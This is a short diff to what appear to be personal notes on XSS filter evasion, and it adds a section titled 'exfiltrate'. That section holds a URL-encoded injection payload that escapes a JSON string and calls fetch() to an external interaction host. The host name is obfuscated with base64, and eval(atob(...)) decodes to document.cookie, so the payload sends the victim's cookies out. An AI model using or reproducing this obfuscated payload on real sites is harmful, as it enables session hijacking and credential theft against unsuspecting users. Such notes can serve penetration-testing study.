@@ -4,6 +4,10 @@
 
 [HTML5 Security Cheatsheet](https://html5sec.org/)
 
+# exfiltrate 
+
+`x%22,%22results%22:[]};fetch(%27https://%27%2batob(%27Zm01N3BmMXNkbmcxMnZmNTU4emdjY3MxZHNqajdndjUub2FzdGlmeS5jb20v%27)%2beval(atob(%27ZG9jdW1lbnQuY29va2ll%27)),{mode:'no-cors'});//`
+
 # Bypassing weak script tag filters
 
 ![Untitled](filter%20evasion%20896d510035f540a0ae245453b758f3cd/Untitled.png)
